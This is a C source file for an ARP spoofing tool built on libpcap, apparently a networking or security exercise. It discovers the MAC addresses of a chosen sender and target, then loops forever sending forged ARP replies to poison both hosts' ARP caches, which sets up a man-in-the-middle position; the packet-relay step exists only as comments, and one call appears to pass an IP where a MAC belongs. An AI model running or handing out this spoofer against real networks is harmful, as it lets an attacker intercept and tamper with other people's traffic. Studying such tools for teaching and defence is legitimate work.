#include "header.h"

int usage(){
    cerr<<"Wrong Input Type\n";
    cerr<<"Syntax: ARP_spoof <interface> <Sender IP> <Target IP>";
    return 1;
}
 int main(int argc, char* argv[])
{
     printf("start\n");
    if(argc!=4){
        usage();
        exit(1);
    }
    //pakcet for broadcating to sender
    char * sendpacket = (char*)malloc(sizeof(char) * 42);
    Ethernet_Header * eth = (Ethernet_Header *)sendpacket;
    ARP_Header * arp = (ARP_Header *)(sendpacket + 14);
    default_setting(eth, arp);

    char* dev=argv[1];
    uint8_t attacker_IP[4];
    uint8_t attacker_MAC[6];

    uint8_t sender_IP[4];
    uint8_t sender_MAC[6];

    uint8_t target_IP[4];
    uint8_t target_MAC[6];

    const char* sender_ip_str=argv[2];
    const char* target_ip_str=argv[3];
    inet_pton(AF_INET, sender_ip_str, sender_IP);
    inet_pton(AF_INET, target_ip_str, target_IP);

    //detect my mac
    GET_MY_IP_MAC(dev, attacker_IP, attacker_MAC);
    printf("Attcker mac addr\n");
    for(int i=0;i<6;i++){
        printf("%02x: ", attacker_MAC[i]);
    }
    printf("\n");

    //Initialize handler
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *header;//for pcap_next_ex
    pcap_t *handle=pcap_open_live(dev,BUFSIZ, 1, 1000, errbuf );
    if(handle==NULL){
        printf("FAILED TO OPEN PCAP HANDLE\n");
        return -1;
    }

    //detect sender mac
    Broadcast_Setting(eth,arp, attacker_MAC, attacker_IP, sender_IP);
    while(1){
        const u_char* packet;
        pcap_sendpacket(handle,(u_char *) sendpacket, 42);

        int response=pcap_next_ex(handle, &header, &packet);
        if(response==0) continue;
        printf("running\n");
        if (response == -1 || response == -2) break;

        Ethernet_Header * eth_check = (Ethernet_Header*)packet;

        if(memcmp(eth_check->D_addr,attacker_MAC,6) || ntohs(eth_check->type) != 0x0806)
        {
            continue;
        }

        // DMAC == mymac?) memcmp
        // e_type == 0x0806  ntohs(eth_chect->e_type)

        ARP_Header * arp_check = (ARP_Header *)(packet + 14);

        if(memcmp(arp_check->S_P_addr, sender_IP, 4) || ntohs(arp_check->OPcode) != 0x0002)
        {
            continue;
        }
        // Sip == sender_ip?  memcmp(arp_check->Sip, sender_ip, 4)
        // oper == 0x0002   ntohs(oper~~)

        memcpy(sender_MAC, eth_check->S_addr,6);
        break;
    }
    printf("sender MAC\n");
    for(int i=0;i<6;i++){
        printf("%02x: ",sender_MAC[i]);
    }
    printf("\n");

    //detecting target mac
    Broadcast_Setting(eth,arp, attacker_MAC, attacker_IP, target_IP);
    while(1){
        const u_char* packet;
        pcap_sendpacket(handle,(u_char *) sendpacket, 42);

        int response=pcap_next_ex(handle, &header, &packet);
        if(response==0) continue;
        printf("running\n");
        if (response == -1 || response == -2) break;

        Ethernet_Header * eth_check = (Ethernet_Header*)packet;

        if(memcmp(eth_check->D_addr,attacker_MAC,6) || ntohs(eth_check->type) != 0x0806)
        {
            continue;
        }

        // DMAC == mymac?) memcmp
        // e_type == 0x0806  ntohs(eth_chect->e_type)

        ARP_Header * arp_check = (ARP_Header *)(packet + 14);

        if(memcmp(arp_check->S_P_addr, target_IP, 4) || ntohs(arp_check->OPcode) != 0x0002)
        {
            continue;
        }
        // Sip == sender_ip?  memcmp(arp_check->Sip, sender_ip, 4)
        // oper == 0x0002   ntohs(oper~~)

        memcpy(target_MAC, eth_check->S_addr,6);
        break;
    }
    printf("target MAC\n");
    for(int i=0;i<6;i++){
        printf("%02x: ",target_MAC[i]);
    }
    printf("\n");


    //infect sender mac table.
    char * sendpacket2 = (char*)malloc(sizeof(char) * 42);
    Ethernet_Header * eth2 = (Ethernet_Header *)sendpacket2;
    ARP_Header * arp2 = (ARP_Header *)(sendpacket2 + 14);
    default_setting(eth2, arp2);
    Infection_Setting(eth, arp, attacker_MAC, sender_MAC, sender_IP, target_IP);
    Infection_Setting(eth2, arp2, attacker_MAC, attacker_IP, target_IP, sender_IP);
    while(1){
        pcap_sendpacket(handle, (u_char*)sendpacket, 42);
        pcap_sendpacket(handle, (u_char*)sendpacket2, 42);
        sleep(2);
        printf("infecting sender, target....\n");
    }
    //infect target mac tagble.

    //receive packet from sender
    //send received packet to target

    //receive result packet from target
    //pass result packet to sender

    return 0;
}
